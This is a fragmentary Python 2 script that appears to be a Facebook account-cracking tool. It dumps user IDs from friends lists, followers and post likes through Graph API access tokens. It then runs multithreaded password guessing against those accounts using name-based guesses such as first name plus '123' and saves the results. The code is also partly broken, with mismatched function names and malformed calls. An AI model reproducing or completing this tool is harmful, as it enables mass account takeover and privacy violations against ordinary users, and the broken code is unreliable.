...
def banner():
	os.system("clear")
        print(""""
"\033[1;91m" _______                             __                                       ________
"\033[1;91m"|       \                           |  \                                     |        \
"\033[1;91m"| ▓▓▓▓▓▓▓\ ______  _______   ______ | ▓▓____   ______   ______  ________      \▓▓▓▓▓▓▓▓______ ____
"\033[1;91m"| ▓▓__| ▓▓/      \|       \ /      \| ▓▓    \ |      \ |      \|        \       | ▓▓  |      \    \
"\033[1;91m"| ▓▓    ▓▓  ▓▓▓▓▓▓\ ▓▓▓▓▓▓▓\  ▓▓▓▓▓▓\ ▓▓▓▓▓▓▓\ \▓▓▓▓▓▓\ \▓▓▓▓▓▓\\▓▓▓▓▓▓▓▓       | ▓▓  | ▓▓▓▓▓▓\▓▓▓▓\
"\033[1;91m"| ▓▓▓▓▓▓▓\ ▓▓  | ▓▓ ▓▓  | ▓▓ ▓▓  | ▓▓ ▓▓  | ▓▓/      ▓▓/      ▓▓ /    ▓▓        | ▓▓  | ▓▓ | ▓▓ | ▓▓
...
def rongbaaz_tm():
    ...
    try:
        ...
        print '\n %s[%s×%s] INVALID TOKEN'%(N,M,N);time.sleep(2);os.system('rm -rf token.txt');rongbaaz()
    try:
    ...
    if innocent == '':
        print "\n %s[%s×%s] DON'T LEAVE IT BLANK"%(N,M,N);time.sleep(2);rongbaaz_tm()
        ...
        try:
            ...
            for fuck in total:
            	nunu = fuck.replace("\n","")
                titid  = nunu.replace(" [✓] "," \x1b[0m[\x1b[1;91m✓\x1b[0m]\x1b[1;91m ").replace(" [×] ", " \x1b[0m[\x1b[1;93m×\x1b[0m]\x1b[1;93m ")
                print("%s%s"%(titid,N));time.sleep(0.03)
            print(" %s[%s#%s] __________________________________________________________________________________"%(N,O,N))
            raw_input('\n  [ %sBACK%s ] '%(O,N));rongbaaz_tm()
        except (IOError):
        ...
        print '\n %s[%s×%s] CHECK THE MENU [%s%s%s] IS NOT HERE.!'%(N,M,N,M,innocent,N);time.sleep(2);rongbaaz_tm()
...
def teman(nunu):
    ...
    try:
        ...
        for a in requests.get('https://graph.facebook.com/me/friends?access_token=%s'%(nunu)).json()["data"]:
            ...
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;92m', '\x1b[0m'])
        ...
        os.system('echo "_____________________________________________________________________________________________" | lolcat -a -d 2 -8')
        raw_input(' [%s ENTER%s ] '%(O,N));rongbaaz_tm()
    except (KeyError,IOError):
        os.remove(cin)
        jalan('\n %s[%s!%s] ID DUMP FAILED, MAYBE THE ID IS NOT PUBLIC.\n'%(N,M,N))
        raw_input(' [ %sBACK%s ] '%(O,N));rongbaaz_tm()
...
def followers(nunu):
    ...
    try:
        ...
        os.system('echo "_______________________________________________________________________________________________" | lolcat -a -d 2 -8')
...
def postingan(nunu):
    ...
    try:
        ...
        for a in requests.get('https://graph.facebook.com/%s/likes?access_token=%s'%(mravu,nunu)).json()["data"]:
            ...
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;92m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;91m%s\033[0m] [\033[0;92m%s\033[0m] PROCESS DUMP ID...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)
        ...
        os.system('echo "_________________________________________________________________________________________________" | lolcat -a -d 2 -8')
        raw_input('%s [%s ENTER%s ] '%(N,O,N));rongbaaz_tm()
    except (KeyError,IOError):
        os.remove(ahh)
        jalan('\n %s[%s!%s] FAILED TO DUMP ID, PROBABLY ID IS NOT PUBLIC.\n'%(N,M,N))
        raw_input(' [ %sBACK%s ] '%(O,N));rongbaaz_tm()
...
def ua_change():
    ...
    try:
        ...
        raw_input('\n  %s[ %sBACK%s ]'%(N,O,N));rongbaaz_tm()
    except:pass


def check_uag():
    try:
        user_agent = open('rbcst_ua.txt', 'r').read()
    except IOError:
    	user_agent = '%s-'%(M)
    except: pass
...
class __crack__:
    ...
    def plerr(self):
        try:
            ...
            raw_input('\n  %s[ %sBACK%s ]'%(N,O,N));rongbaaz_tm()
        ___rongbaaz_tm___ = raw_input(' [%s?%s] DO YOU WANT TO USE A MANUAL PASSWORD?  [Y/n]: '%(O,N))
        if ___rongbaaz_tm___ in ('Y', 'y'):
            ...
            while True:
                ...
                if pwek == '':
                    ...
                    def __rongbaaz__(uvarm=None): 
                        cin = raw_input('\n [*] METHOD : ')
                        if cin == '':
                            print "\n %s[%s×%s] DON'T EMPTY "%(N,M,N);self.__rongbaaz__()
                        elif cin == '1':
                            ...
                            with rongbaaz_tm(max_workers=30) as (__rongbaaz__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __rongbaaz__.submit(self.__api__, kimochi, uvarm)
                                    except: pass
                            ...
                            with rongbaaz_tm(max_workers=30) as (__rongbaaz__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __rongbaaz__.submit(self.__mbasic__, kimochi, uvarm)
                                    except: pass
                            ...
                            with rongbaaz_tm(max_workers=30) as (__rongbaaz__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __rongbaaz__.submit(self.__mfb,__, kimochi, uvarm)
                                    except: pass
                    ...
                    __rongbaaz__(pwek.split(','))
                    break
        elif ___rongbaa_tm___ in ('N', 'n'):
            ...
            print '\n %s[%s×%s] Y/N STUPID! -_-'%(N,M,N);time.sleep(2);rongbaaztm()
        return
    ...
    def __pler__(self):
        ...
        if axm == '':
            	...
            	for azmx in self.id: 
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            xnx = [name, xz[0]+"123", xz[0]+"12345"]
                        __rongbaaz__.submit(self.__api__, uid, xnx)
                    except:
                        pass
            ...
            print ' [%s+%s] CP RESULTS ARE SAVED TO -> RESULTS/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] YOU CAN TURN OFF MOBILE DATA TO PAUSE THE CRACK PROCESS\n'%(M,N)
            with axim_xau(max_workers=30) as (__rongbaaz__):
            	for azmx in self.id: 
                    try:
                        uid, name = azmx.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            xnx = [name, xz[0]+"123", xz[0]+"12345"]
                        __rongbaaz__.submit(self.__mbasic__, uid, xnx)
                    except:
                        pass
